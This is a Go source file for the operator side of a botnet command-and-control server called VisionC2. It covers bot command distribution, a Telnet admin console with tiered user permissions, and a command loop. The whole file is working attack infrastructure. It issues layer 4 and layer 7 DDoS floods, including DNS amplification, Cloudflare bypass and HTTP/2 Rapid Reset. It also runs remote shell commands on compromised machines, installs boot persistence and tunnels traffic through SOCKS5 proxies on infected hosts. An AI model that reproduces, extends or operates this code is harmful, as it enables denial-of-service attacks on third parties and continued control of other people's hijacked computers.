package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

// ============================================================================
// BOT COMMAND DISTRIBUTION
// Functions for sending commands to bots (broadcast or targeted).
// Handle command routing, error recovery, and response tracking.
// ============================================================================

// sendToBots broadcasts a command to ALL authenticated bots
// Thread-safe: uses RLock to allow concurrent command sends
// Failed sends trigger async bot removal (don't block other sends)
// Logs command with sent count vs total for verification
// Used by DDoS commands, shell commands, and bot management
func sendToBots(command string) {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	sentCount := 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			_, err := botConn.conn.Write([]byte(command + "\n"))
			if err != nil {
				logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
				// Mark for cleanup in background (don't block other sends)
				go removeBotConnection(botConn.botID)
			} else {
				sentCount++
			}
		}
	}

	logMsg("[COMMAND] Sent to %d/%d bots: %s", sentCount, len(botConnections), command)
}

// sendToFilteredBots sends a command to bots matching the specified filters
// archFilter: filter by architecture (empty = all)
// minRAM: minimum RAM in MB (0 = no filter)
// maxBots: max bots to send to (0 = all)
// Returns the count of bots sent to
func sendToFilteredBots(command string, archFilter string, minRAM int64, maxBots int) int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	sentCount := 0
	for _, botConn := range botConnections {
		if !botConn.authenticated {
			continue
		}

		// Apply architecture filter
		if archFilter != "" && botConn.arch != archFilter {
			continue
		}

		// Apply minimum RAM filter
		if minRAM > 0 && botConn.ram < minRAM {
			continue
		}

		// Apply max bots limit
		if maxBots > 0 && sentCount >= maxBots {
			break
		}

		_, err := botConn.conn.Write([]byte(command + "\n"))
		if err != nil {
			logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
			go removeBotConnection(botConn.botID)
		} else {
			sentCount++
		}
	}

	filterDesc := ""
	if archFilter != "" {
		filterDesc += fmt.Sprintf(" arch=%s", archFilter)
	}
	if minRAM > 0 {
		filterDesc += fmt.Sprintf(" minRAM=%dMB", minRAM)
	}
	if maxBots > 0 {
		filterDesc += fmt.Sprintf(" max=%d", maxBots)
	}
	if filterDesc == "" {
		filterDesc = " (no filters)"
	}

	logMsg("[COMMAND] Sent to %d bots%s: %s", sentCount, filterDesc, command)
	return sentCount
}

// sendToSingleBot sends a command to a specific bot by ID (for TUI use)
// Sets up commandOrigin for TUI shell response routing
func sendToSingleBot(botID string, command string) bool {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	for id, botConn := range botConnections {
		if id == botID || strings.HasPrefix(id, botID) {
			if botConn.authenticated {
				_, err := botConn.conn.Write([]byte(command + "\n"))
				if err != nil {
					logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
					go removeBotConnection(botConn.botID)
					return false
				}
				logMsg("[TUI-SHELL] Sent to bot %s: %s", botConn.botID, command)
				return true
			}
		}
	}
	return false
}

// sendToBot sends a command to a specific bot by ID (full or partial match)
// Supports partial ID matching (first N characters) for convenience
// Tracks command origin in commandOrigin map so response routes back to user
// Returns true if command was sent successfully, false otherwise
// Used for !<botid> <command> syntax to target individual bots
func sendToBot(botID string, command string, userConn net.Conn, c *client) bool {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	for id, botConn := range botConnections {
		// Match full ID or partial prefix
		if id == botID || strings.HasPrefix(id, botID) {
			if botConn.authenticated {
				// Track which user sent this command for response routing
				originLock.Lock()
				commandOrigin[botConn.botID] = userConn
				originLock.Unlock()

				_, err := botConn.conn.Write([]byte(command + "\n"))
				if err != nil {
					logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
					go removeBotConnection(botConn.botID)
					return false
				}
				logMsg("[COMMAND] User %s (%s) sent to bot %s: %s",
					c.user.Username, c.getLevelString(), botConn.botID, command)
				return true
			}
		}
	}
	return false
}

// showAttackMenu displays all available attack methods
// Separate from main help to save screen space
func (c *client) showAttackMenu(conn net.Conn) {
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n"))
	conn.Write([]byte("\033[1;97m║              \033[1;31m ℣isionC2 Attack Methods ☠\033[1;97m                   ║\r\n"))
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;33mLayer 4 (Network)\033[1;97m                                         ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !udpflood  <ip> <port> <time>  - UDP flood                ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !tcpflood  <ip> <port> <time>  - TCP flood                ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !syn       <ip> <port> <time>  - SYN flood                ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !ack       <ip> <port> <time>  - ACK flood                ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !gre       <ip> <port> <time>  - GRE flood                ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !dns       <ip> <port> <time>  - DNS amplification        ║\r\n"))
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;35mLayer 7 (Application)\033[1;97m                                      ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !http      <url> <port> <time> - HTTP GET/POST flood      ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !https     <url> <port> <time> - HTTPS/TLS flood          ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !tls       <url> <port> <time> - TLS flood (alias)        ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !cfbypass  <url> <port> <time> - Cloudflare bypass        ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !rapidreset<url> <port> <time> - HTTP/2 Rapid Reset       ║\r\n"))
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;36mControl\033[1;97m                                                    ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !stop                          - Stop all attacks         ║\r\n"))
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;32mProxy Mode (L7 only)\033[1;97m - Add at end: -p <proxy_url.txt>     ║\r\n"))
	conn.Write([]byte("\033[1;97m║    Example: !http site.com 443 60 -p http://x.com/proxy.txt  ║\r\n"))
	conn.Write([]byte("\033[1;97m╚══════════════════════════════════════════════════════════════╝\r\n"))
	conn.Write([]byte("\033[0m\r\n"))
}

func (c *client) writeHeader(conn net.Conn) {
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n"))
	conn.Write([]byte(fmt.Sprintf("\033[1;97m║              \033[1;31m℣isionC2 Help Menu [%s]\033[1;97m                    ║\r\n", c.getLevelString())))
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
}

// writeGeneralCommands outputs the basic utility commands available to all users
// Includes: bots list, clear screen, banner, help, ongoing attacks, logout
// These are non-destructive informational commands
func (c *client) writeGeneralCommands(conn net.Conn) {
	commands := []string{
		"║  \033[1;32mGeneral Commands\033[1;97m                                           ║",
		"║    bots           - List all connected bots                  ║",
		"║    clear/cls      - Clear screen                             ║",
		"║    ongoing        - Show ongoing attacks                     ║",
		"║    logout/exit    - Disconnect from C2                       ║",
		"║  \033[1;31mAttack Commands\033[1;97m                                            ║",
		"║    attack/methods - Show all attack methods                  ║",
	}
	c.writeSection(conn, commands)
}

// writeShellCommands outputs remote code execution commands (Admin+ only)
// !shell: Executes command and waits for output (blocking)
// !detach: Executes command in background (non-blocking, no output)
// !stream: Real-time output streaming for long-running commands
func (c *client) writeShellCommands(conn net.Conn) {
	commands := []string{
		"║  \033[1;36mShell Commands\033[1;97m (sent to ALL bots)       ║",
		"║    !shell <command>   - Remote Scripting                     ║",
		"║    !detach <command>  - Run command in background            ║",
		"║    !stream <command>  - Real-time output streaming           ║",
	}
	c.writeSection(conn, commands)
}

// writeBotTargeting outputs syntax for targeting individual bots (Pro+ only)
// Allows sending commands to specific bot by ID prefix or full ID
// Format: !<botid> <command> - routes command to just that bot
// Useful for testing commands or controlling specific compromised systems
func (c *client) writeBotTargeting(conn net.Conn) {
	commands := []string{
		"║  \033[1;33mBot Targeting\033[1;97m                           ║",
		"║    !<botid> <cmd>     - Send command to specific bot         ║",
		"║    Example: !abc123 !shell whoami                            ║",
	}
	c.writeSection(conn, commands)
}

// writeBotManagement outputs bot lifecycle commands (Admin+ only)
// !reinstall: Forces bots to re-download and reinstall (update mechanism)
// !lolnogtfo: Kills bot process - removes from infected system (cleanup)
// !persist: Sets up boot persistence via cron/systemd/init scripts
// !info: Requests system info from all bots
func (c *client) writeBotManagement(conn net.Conn) {
	commands := []string{
		"║  \033[1;34mBot Management\033[1;97m (sent to ALL bots)       ║",
		"║    !reinstall         - Force reinstall bot                  ║",
		"║    !lolnogtfo         - Kill/remove bot                      ║",
		"║    !persist           - Setup persistence                    ║",
		"║    !info              - Get bot info                         ║",
	}
	c.writeSection(conn, commands)
}

// writePrivateCommands outputs owner-only sensitive commands
// private: Shows this section (meta-command)
// db: Displays all user credentials from users.json
// !socks: Establishes SOCKS5 proxy through bots for traffic tunneling
// !stopsocks: Terminates active proxy connections
func (c *client) writeSocksCommands(conn net.Conn) {
	commands := []string{
		"║  \033[1;35mSOCKS5 Proxy\033[1;97m                                ║",
		"║    !socks <port>      - Start SOCKS5 proxy on port          ║",
		"║    !stopsocks         - Stop SOCKS5 proxy                   ║",
		"║    !socksauth <u> <p> - Set proxy username & password       ║",
	}
	c.writeSection(conn, commands)
}

func (c *client) writePrivateCommands(conn net.Conn) {
	commands := []string{
		"║  \033[1;35mPrivate Commands\033[1;97m (Owner only)                             ║",
		"║    private            - Show private commands                ║",
		"║    db                 - Show user database                   ║",
	}
	c.writeSection(conn, commands)
}

func (c *client) writeSection(conn net.Conn, commands []string) {
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
	for _, cmd := range commands {
		conn.Write([]byte(fmt.Sprintf("\033[1;97m%s\r\n", cmd)))
	}
}

func (c *client) writeFooter(conn net.Conn) {
	conn.Write([]byte("\033[1;97m╚══════════════════════════════════════════════════════════════╝\r\n"))
	conn.Write([]byte("\033[0m\r\n"))
}

// ============================================================================
// USER SESSION HANDLER
// Main function handling admin CLI sessions from login to command processing.
// Implements the full user interface: login, banner, command loop, logout.
// ============================================================================

// handleRequest processes an incoming user connection for admin CLI access
// Performs Telnet negotiation for proper terminal handling
// Requires "spamtec" prefix as connection identifier/handshake
// Handles authentication, banner display, and main command loop
// Processes all user commands: attacks, shell, bot management, etc.
func handleRequest(conn net.Conn) {
	defer conn.Close() // Clean up on exit

	// Telnet negotiation for proper terminal handling
	// IAC WILL ECHO, IAC WILL SGA (suppress go ahead), IAC WONT LINEMODE
	conn.Write([]byte{255, 251, 1})  // IAC WILL ECHO
	conn.Write([]byte{255, 251, 3})  // IAC WILL SGA
	conn.Write([]byte{255, 252, 34}) // IAC WONT LINEMODE

	conn.Write([]byte(getConsoleTitleAnsi("☾℣☽")))

	// Use a single buffered reader for the entire connection
	reader := bufio.NewReader(conn)

	readString, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	if strings.HasPrefix(readString, "spamtec") {
		if authed, c := authUser(conn, reader); authed {
			showBanner(conn)
			conn.Write([]byte(fmt.Sprintf("\033[0m\r  \033[38;5;15m\033[38;5;118m✅ Authentication Successful | Level: %s\n", c.getLevelString())))

			for {
				fmt.Fprintf(conn, "\n\r\033[38;5;146m[\033[38;5;161m%s\033[38;5;89m@\033[38;5;146m%s\033[38;5;146m]\033[38;5;82m► \033[0m", c.getLevelString(), c.user.Username)

				readString, err := reader.ReadString('\n')
				if err != nil {
					// Connection closed (EOF) or error - exit cleanly without logging
					return
				}
				readString = strings.TrimSuffix(readString, "\r\n")
				readString = strings.TrimSuffix(readString, "\n")

				parts := strings.Fields(readString)
				if len(parts) < 1 {
					continue
				}
				command := parts[0]
				switch strings.ToLower(command) {

				case "!udpflood", "!tcpflood", "!http", "!https", "!tls", "!cfbypass", "!rapidreset", "!syn", "!ack", "!gre", "!dns":
					if !c.canUseDDoS() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: DDoS commands require at least Basic level\r\n\033[0m"))
						continue
					}

					if len(parts) < 4 {
						conn.Write([]byte("Usage: method ip/url port duration [-p proxy_url.txt]\r\n"))
						continue
					}

					method := parts[0]
					ip := parts[1]
					port := parts[2]
					duration := parts[3]

					// Check for proxy mode: -p <proxy_url>
					proxyMode := false
					proxyURL := ""
					if len(parts) >= 6 && parts[4] == "-p" {
						// Proxy mode only for L7 methods
						if method == "!http" || method == "!https" || method == "!tls" || method == "!cfbypass" || method == "!rapidreset" {
							proxyMode = true
							proxyURL = parts[5]
							conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Proxy URL:\033[0m %s\r\n", proxyURL)))
							conn.Write([]byte("\033[38;5;46m✓ Bots will fetch & rotate proxies without validation (max RPS)\033[0m\r\n"))
						} else {
							conn.Write([]byte("\033[1;33m⚠ Proxy mode (-p) only supported for L7 methods: !http, !https, !tls, !cfbypass\r\n\033[0m"))
						}
					}

					dur, err := time.ParseDuration(duration + "s")
					if err != nil {
						conn.Write([]byte("Invalid duration format.\r\n"))
						continue
					}
					conn.Write([]byte("\r\n"))
					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Target:\033[0m %s\r\n", ip)))
					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Port:\033[0m %s\r\n", port)))
					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Duration:\033[0m %ss\r\n", duration)))
					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Method:\033[0m %s\r\n", method)))
					if proxyMode {
						conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Proxy URL:\033[0m %s\r\n", proxyURL)))
					}
					conn.Write([]byte("\r\n"))

					ongoingAttacks[conn] = attack{
						method:   method,
						ip:       ip,
						port:     port,
						duration: dur,
						start:    time.Now(),
					}

					go func(conn net.Conn, attack attack) {
						time.Sleep(attack.duration)
						delete(ongoingAttacks, conn)
						conn.Write([]byte("\033[38;5;46m✓ Attack completed and removed.\033[0m\n"))
					}(conn, ongoingAttacks[conn])

					// Build command string - send proxy URL to bots (they fetch & rotate without validation)
					if proxyMode && proxyURL != "" {
						// Send proxy URL with -pu flag (bots fetch the list themselves)
						sendToBots(fmt.Sprintf("%s %s %s %s -pu %s", method, ip, port, duration, proxyURL))
					} else {
						sendToBots(fmt.Sprintf("%s %s %s %s", method, ip, port, duration))
					}

				case "!stop":
					if !c.canUseDDoS() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: DDoS commands require at least Basic level\r\n\033[0m"))
						continue
					}
					// Clear all ongoing attacks
					count := len(ongoingAttacks)
					for k := range ongoingAttacks {
						delete(ongoingAttacks, k)
					}
					// Send stop to all bots
					sendToBots("!stop")
					conn.Write([]byte(fmt.Sprintf("\033[38;5;46m✓ Stopped %d attack(s). Kill signal sent to all bots.\033[0m\r\n", count)))

				case "ongoing":
					if !c.canUseDDoS() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: DDoS commands require at least Basic level\r\n\033[0m"))
						continue
					}
					// Show ongoing attacks
					conn.Write([]byte("Ongoing Attacks:\r\n"))
					for _, attack := range ongoingAttacks {
						remaining := time.Until(attack.start.Add(attack.duration))
						if remaining > 0 {
							conn.Write([]byte(fmt.Sprintf("  %s -> %s:%s (%v remaining)\r\n",
								attack.method, attack.ip, attack.port, remaining.Round(time.Second))))
						}
					}

				case "!shell", "!exec":
					if !c.canUseShell() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Shell commands require at least Pro level\r\n\033[0m"))
						continue
					}
					if len(parts) < 2 {
						conn.Write([]byte("usage: !shell <command>\r\n"))
						continue
					}
					shellCmd := strings.Join(parts[1:], " ")
					sendToBots(fmt.Sprintf("!shell %s", shellCmd))
					conn.Write([]byte(fmt.Sprintf("Shell command sent to all bots: %s\r\n", shellCmd)))
					conn.Write([]byte("Waiting for bot responses...\r\n"))

				case "!detach", "!bg":
					if !c.canUseShell() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Shell commands require at least Pro level\r\n\033[0m"))
						continue
					}
					if len(parts) < 2 {
						conn.Write([]byte("usage: !detach <command>\r\n"))
						continue
					}
					shellCmd := strings.Join(parts[1:], " ")
					sendToBots(fmt.Sprintf("!detach %s", shellCmd))
					conn.Write([]byte(fmt.Sprintf("Detached command sent to all bots: %s\r\n", shellCmd)))

				case "banner":
					showBanner(conn)

				case "bots", "bot":
					conn.Write([]byte(fmt.Sprintf("\033[38;5;27m[\033[38;5;15mBots\033[38;5;73m: \033[38;5;15m%d \033[38;5;27m] \n\r", getBotCount())))
					// Show bot details
					botConnsLock.RLock()
					if len(botConnections) > 0 {
						conn.Write([]byte("\n\rConnected Bots:\r\n"))
						conn.Write([]byte("──────────────────────────────────────\r\n"))
						for _, botConn := range botConnections {
							uptime := time.Since(botConn.connectedAt).Round(time.Second)
							lastSeen := time.Since(botConn.lastPing).Round(time.Second)
							conn.Write([]byte(fmt.Sprintf("  ID: %s | IP: %s | Arch: %s | RAM: %s\n\r",
								botConn.botID, botConn.ip, botConn.arch, formatRAM(botConn.ram))))
							conn.Write([]byte(fmt.Sprintf("      Uptime: %v | Last: %v\n\r", uptime, lastSeen)))
						}
					}
					botConnsLock.RUnlock()

				case "cls", "clear":
					conn.Write([]byte("\033[2J\033[H"))
					showBanner(conn)

				case "logout", "exit":
					conn.Write([]byte("\033[38;5;27mLogging out...\n\r"))
					conn.Close()
					return

				case "!reinstall":
					if !c.canUseBotManagement() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Bot management commands require at least Admin level\r\n\033[0m"))
						continue
					}
					sendToBots("!reinstall")
					conn.Write([]byte("\033[1;33mReinstall command sent to all bots\r\n\033[0m"))

				case "!lolnogtfo":
					if !c.canUseBotManagement() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Bot management commands require at least Admin level\r\n\033[0m"))
						continue
					}
					sendToBots("!kill")
					conn.Write([]byte("\033[1;33mKill command sent to all bots\r\n\033[0m"))

				case "persist":
					if !c.canUseBotManagement() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Bot management commands require at least Admin level\r\n\033[0m"))
						continue
					}
					sendToBots("!persist")
					conn.Write([]byte("\033[1;33mPersistence command sent to all bots\r\n\033[0m"))

				case "help":
					c.showHelpMenu(conn)

				case "attack", "attacks", "methods":
					if !c.canUseDDoS() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Attack commands require at least Basic level\r\n\033[0m"))
						continue
					}
					c.showAttackMenu(conn)
				case "db":
					if !c.canUsePrivate() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Database access requires Owner level\r\n\033[0m"))
						continue
					}

					// Read the raw JSON file
					data, err := os.ReadFile(USERS_FILE)
					if err != nil {
						conn.Write([]byte(fmt.Sprintf("Error reading credentials file: %v\r\n", err)))
						continue
					}

					conn.Write([]byte("\n\r\033[1;36m════════════════════ User Database ════════════════════\r\n\033[0m"))

					// Try to parse as structured JSON first
					var users []map[string]interface{}
					if err := json.Unmarshal(data, &users); err == nil {
						// Successfully parsed as JSON array
						for i, user := range users {
							username, _ := user["Username"].(string)
							password, _ := user["Password"].(string)
							level, _ := user["Level"].(string)
							expireStr, _ := user["Expire"].(string)

							// Parse expire time
							expireTime := time.Time{}
							if expireStr != "" {
								// Try multiple time formats
								formats := []string{
									"2006-01-02T15:04:05Z07:00",
									"2006-1-2T15:04:05Z07:00",
									"2006-01-02 15:04:05",
									time.RFC3339,
								}

								for _, format := range formats {
									if t, err := time.Parse(format, expireStr); err == nil {
										expireTime = t
										break
									}
								}
							}

							// Format expiration status
							expired := ""
							if !expireTime.IsZero() && expireTime.Before(time.Now()) {
								expired = " \033[1;31m[EXPIRED]\033[0m"
							} else if !expireTime.IsZero() {
								expired = fmt.Sprintf(" \033[1;32m[%s]\033[0m", time.Until(expireTime).Round(24*time.Hour))
							}

							// Format the output
							expireDisplay := "N/A"
							if !expireTime.IsZero() {
								expireDisplay = expireTime.Format("2006-01-02 15:04:05")
							}

							conn.Write([]byte(fmt.Sprintf("  \033[1;33m%d.\033[0m \033[1;37mUser:\033[0m %-15s \033[1;37mPass:\033[0m %-15s \033[1;37mLevel:\033[0m %-8s \033[1;37mExpires:\033[0m %s%s\r\n",
								i+1, username, password, level, expireDisplay, expired)))
						}
					} else {
						// If JSON parsing fails, show raw data
						conn.Write([]byte("\033[1;31mCould not parse JSON, showing raw data:\033[0m\r\n"))
						conn.Write([]byte(string(data)))
						conn.Write([]byte("\r\n"))
					}

					conn.Write([]byte("\033[1;36m═══════════════════════════════════════════════════\r\n\033[0m"))
				case "?":
					conn.Write([]byte("\033[1;33m'help' - commands  |  'attack' - attack methods\r\n\033[0m"))

				case "private":
					if !c.canUsePrivate() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Private commands require Owner level\r\n\033[0m"))
						continue
					}
					conn.Write([]byte("\033[1;35m=== Private Commands (Owner Only) ===\r\n"))
					conn.Write([]byte("db            - Show user database\r\n"))
					conn.Write([]byte("\033[0m"))

				case "!socks":
					if !c.canUseShell() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: SOCKS commands require at least Pro level\r\n\033[0m"))
						continue
					}
					if len(parts) < 2 {
						conn.Write([]byte("Usage: !socks <port>\r\n"))
						conn.Write([]byte("Example: !socks 1080\r\n"))
						continue
					}
					port := parts[1]
					sendToBots(fmt.Sprintf("!socks %s", port))
					conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 proxy started on port %s for all bots\r\n\033[0m", port)))

				case "!stopsocks":
					if !c.canUseShell() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: SOCKS commands require at least Pro level\r\n\033[0m"))
						continue
					}
					sendToBots("!stopsocks")
					conn.Write([]byte("\033[1;35mSOCKS5 proxy stop command sent to all bots\r\n\033[0m"))

				case "!socksauth":
					if !c.canUseShell() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: SOCKS commands require at least Pro level\r\n\033[0m"))
						continue
					}
					if len(parts) < 3 {
						conn.Write([]byte("Usage: !socksauth <username> <password>\r\n"))
						continue
					}
					sendToBots(fmt.Sprintf("!socksauth %s %s", parts[1], parts[2]))
					conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 auth updated (user: %s) on all bots\r\n\033[0m", parts[1])))

				case "!info":
					if !c.canUseBotManagement() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Info command requires at least Admin level\r\n\033[0m"))
						continue
					}
					sendToBots("!info")
					conn.Write([]byte("Info request sent to all bots\r\n"))

				default:
					// Check if this is a bot-targeted command: !<botid> <command>
					if strings.HasPrefix(command, "!") && len(parts) >= 2 {
						botID := strings.TrimPrefix(parts[0], "!")
						// Check if this looks like a bot ID (not a known command)
						knownCommands := map[string]bool{
							"udpflood": true, "tcpflood": true, "http": true, "syn": true,
							"ack": true, "gre": true, "dns": true, "rapidreset": true, "shell": true, "exec": true,
							"detach": true, "bg": true, "persist": true, "kill": true,
							"reinstall": true, "lolnogtfo": true, "socks": true, "stopsocks": true,
							"info": true, "stream": true,
						}

						if !knownCommands[botID] {
							// Check if user can target specific bots
							if !c.canTargetSpecificBot() {
								conn.Write([]byte("\033[1;31m❌ Permission denied: Targeting specific bots requires at least Pro level\r\n\033[0m"))
								continue
							}

							// This is a bot-targeted command
							targetCmd := strings.Join(parts[1:], " ")
							bot := findBotByID(botID)
							if bot != nil {
								if sendToBot(botID, targetCmd, conn, c) {
									conn.Write([]byte(fmt.Sprintf("\033[1;33mCommand sent to bot %s: %s\r\n\033[0m", bot.botID, targetCmd)))
									conn.Write([]byte("Waiting for response...\r\n"))
								} else {
									conn.Write([]byte(fmt.Sprintf("\033[1;31mFailed to send command to bot %s\r\n\033[0m", botID)))
								}
							} else {
								conn.Write([]byte(fmt.Sprintf("\033[1;31mBot not found: %s\r\n\033[0m", botID)))
								conn.Write([]byte("Use 'bots' command to see connected bots\r\n"))
							}
							continue
						}
					}
					logMsg("Received input: '%s'", readString)
					conn.Write([]byte("Invalid command. Type 'help' for available commands.\n\r"))
				}
			}
		}
	}
}
